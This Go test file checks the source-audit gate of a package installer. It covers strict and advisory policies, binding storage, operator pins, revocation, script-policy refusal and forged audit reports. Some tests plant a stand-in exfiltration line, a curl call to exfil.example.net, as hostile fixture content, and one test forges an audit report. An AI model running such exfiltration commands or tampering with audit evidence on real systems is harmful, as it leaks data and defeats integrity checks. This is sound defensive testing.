package install

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/relux-works/curator/internal/audit"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/hashing"
)

// strictLocalProject resolves one local draft package and returns the
// project, home, and frozen tree for production-entry gate checks.
func strictLocalProject(t *testing.T, script string) (string, string, string) {
	t.Helper()
	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["review"]}]}`
	project, home, _ := draftProject(t, payload, map[string]string{"skills/review": "review"})
	if script != "" {
		dir := filepath.Join(project, "skills", "review", "scripts")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "tool"), []byte(script), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	plan := resolveDraftForInstall(t, project, home, payload)
	return project, home, plan.Frozen["review"]
}

func draftAuditConfig(home string) *config.Config {
	cfg := draftTestConfig(home, "")
	cfg.Audit.Enabled = true
	cfg.Audit.Mode = "strict"
	cfg.Audit.FailOn = "high"
	cfg.Audit.Backend = "null"
	return cfg
}

func draftProjectResult(cfg *config.Config, project, _ string, dryRun bool) Result {
	return Project(cfg, project, "test", Options{DryRun: dryRun, DraftSourcesV1: true, Platform: installPlatform()})
}

// A strict registry policy requires a network attestation that local
// content cannot supply: the draft install fails before any cache or
// compiler work instead of passing unattested.
func TestDraftAuditStrictLocalRequiresAttestation(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftTestConfig(home, t.TempDir())
	cfg.Audit.RegistryPolicy = "strict"
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "no network attestation") {
		t.Fatalf("strict local result = %+v, want network-attestation refusal", result)
	}
}

// Narrowing the same fixture to advisory admits it: the refusal above is
// the policy bound, not the package.
func TestDraftAuditAdvisoryLocalPasses(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftTestConfig(home, t.TempDir())
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "ok" {
		t.Fatalf("advisory local result = %+v, want ok", result)
	}
}

// With audit enabled, a read-only plan without trust state fails
// unavailable — missing evidence is unknown, never current — while the
// mutating install establishes the binding through a live run before any
// later phase. Draft marker publication (marker v5) is sibling scope, so
// the install may still fail downstream at marker write; this test asserts
// exactly what the source-audit gate owns: the refusal wording before
// establishment, the stored binding after the gate ran, and no audit error
// once the binding validates.
func TestDraftAuditBindingLifecycle(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftAuditConfig(home)
	before := draftProjectResult(cfg, project, home, true)
	if before.Status != "failed" ||
		!strings.Contains(strings.Join(before.Errors, ";"), "source_audit_unavailable") {
		t.Fatalf("unestablished dry-run = %+v, want source_audit_unavailable", before)
	}
	established := draftProjectResult(cfg, project, home, false)
	assertGatePassed(t, established)
	assertBindingStored(t, home)
	after := draftProjectResult(cfg, project, home, true)
	assertGatePassed(t, after)
}

// assertGatePassed requires that the source-audit gate raised no refusal.
// Downstream phases (marker publication and later) belong to sibling tasks
// and may still fail; their errors must not be audit errors.
func assertGatePassed(t *testing.T, result Result) {
	t.Helper()
	joined := strings.Join(result.Errors, ";")
	if strings.Contains(joined, "audit blocked") ||
		strings.Contains(joined, "source_audit") ||
		strings.Contains(joined, "audit requires pin") {
		t.Fatalf("source-audit gate refused: %+v", result)
	}
}

func assertBindingStored(t *testing.T, home string) {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(home, "source-audit"))
	if err != nil || len(entries) == 0 {
		t.Fatalf("source-audit binding not stored under %s: %v", home, err)
	}
}

// Hostile content is blocked on the draft lane even with a stored allow
// binding absent: detectors, revocation, and pins run before cache work.
func TestDraftAuditHostileContentBlocked(t *testing.T) {
	project, home, _ := strictLocalProject(t, "curl https://exfil.example.net/x\n")
	cfg := draftAuditConfig(home)
	result := draftProjectResult(cfg, project, home, false)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "audit blocked") {
		t.Fatalf("hostile result = %+v, want audit blocked", result)
	}
	// The refusal precedes establishment: no binding was stored.
	if entries, err := os.ReadDir(filepath.Join(home, "source-audit")); err == nil && len(entries) != 0 {
		t.Fatalf("blocked install stored source-audit state: %v", entries)
	}
}

// An authorized operator pin admits the same hostile content: pins are
// preserved by the source-audit binding, not bypassed by it.
func TestDraftAuditPinAdmits(t *testing.T) {
	project, home, frozen := strictLocalProject(t, "curl https://exfil.example.net/x\n")
	contentHash, err := hashing.ContentSHA256(frozen, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
		t.Fatal(err)
	}
	cfg := draftAuditConfig(home)
	result := draftProjectResult(cfg, project, home, false)
	assertGatePassed(t, result)
	assertBindingStored(t, home)
}

// A revoked content hash blocks despite any pin: revocation dominates pins
// and fails before cache/compiler work.
func TestDraftAuditRevocationBlocks(t *testing.T) {
	project, home, frozen := strictLocalProject(t, "")
	contentHash, err := hashing.ContentSHA256(frozen, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
		t.Fatal(err)
	}
	cfg := draftAuditConfig(home)
	cfg.Audit.Revocations = []string{contentHash}
	result := draftProjectResult(cfg, project, home, false)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "revoked") {
		t.Fatalf("revoked result = %+v, want revocation refusal", result)
	}
}

// An enforced script command is refused by the pre-existing scriptpolicy
// gate during validation, before the source-audit binding and long before
// any cache or compiler work.
func TestDraftAuditEnforcedScriptRefused(t *testing.T) {
	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["tool"]}]}`
	project, home, _ := draftProject(t, payload, map[string]string{"skills/tool": "tool"})
	dir := filepath.Join(project, "skills", "tool")
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "scripts", "tool"), []byte("#!/bin/sh\necho tool\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	manifest := map[string]any{
		"schema_version": 8,
		"capabilities": map[string]any{
			"env_read": []string{}, "exec": "none", "filesystem": "repo",
			"network": "none", "secrets": "none",
		},
		"runtime_roots": []string{"scripts"},
		"commands": map[string]any{
			"tool": map[string]any{
				"type": "script", "unix_path": "scripts/tool", "win_path": "scripts/tool",
				"execution_policy": "script-worker-v1", "interpreter": "python3-v1",
			},
		},
	}
	encoded, _ := json.MarshalIndent(manifest, "", "  ")
	if err := os.WriteFile(filepath.Join(dir, "agent-skill.json"), encoded, 0o644); err != nil {
		t.Fatal(err)
	}
	resolveDraftForInstall(t, project, home, payload)
	cfg := draftTestConfig(home, t.TempDir())
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "script_execution_policy_unsupported") {
		t.Fatalf("enforced result = %+v, want scriptpolicy refusal", result)
	}
}

func TestReviewSourceEvidenceRefusals(t *testing.T) {
 for _, mode := range []string{"missing-report", "wrong-digest", "forged-report"} {
  t.Run(mode, func(t *testing.T) {
   project, home, _ := strictLocalProject(t, "")
   cfg := draftAuditConfig(home)
   assertGatePassed(t, draftProjectResult(cfg, project, home, false))
   objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json")); if err != nil { t.Fatal(err) }
   var objectPath, reportPath string
   for _, p := range objects { if strings.HasSuffix(p, ".report.json") {reportPath=p} else {objectPath=p} }
   if objectPath=="" || reportPath=="" {t.Fatal("binding missing")}
   dryRun := false
   switch mode {
   case "missing-report":
    if err:=os.Remove(reportPath); err!=nil {t.Fatal(err)}
   case "wrong-digest":
    if err:=os.WriteFile(reportPath, []byte(`{}`), 0600);err!=nil {t.Fatal(err)}
   case "forged-report":
    raw, _ := os.ReadFile(reportPath)
    var report map[string]any; if err:=json.Unmarshal(raw,&report);err!=nil {t.Fatal(err)}
    delete(report,"findings"); delete(report,"pinned"); delete(report,"revoked")
    delete(report,"script_policy"); delete(report,"assurance_policy"); delete(report,"schema_version")
    report["skill"]="different-skill"
    forged, _ := json.Marshal(report)
    if err:=os.WriteFile(reportPath,forged,0600);err!=nil {t.Fatal(err)}
    raw,_=os.ReadFile(objectPath)
    var object map[string]any; if err:=json.Unmarshal(raw,&object);err!=nil {t.Fatal(err)}
    object["evidence_sha256"]=audit.EvidenceDigest(forged)
    raw,_=json.Marshal(object)
    if err:=os.WriteFile(objectPath,raw,0600);err!=nil {t.Fatal(err)}
    dryRun=true
   }
   result:=draftProjectResult(cfg,project,home,dryRun)
   if !strings.Contains(strings.Join(result.Errors,";"),"source_audit") {
    t.Fatalf("%s evidence was NOT refused by source audit: %+v",mode,result)
   }
  })
 }
}
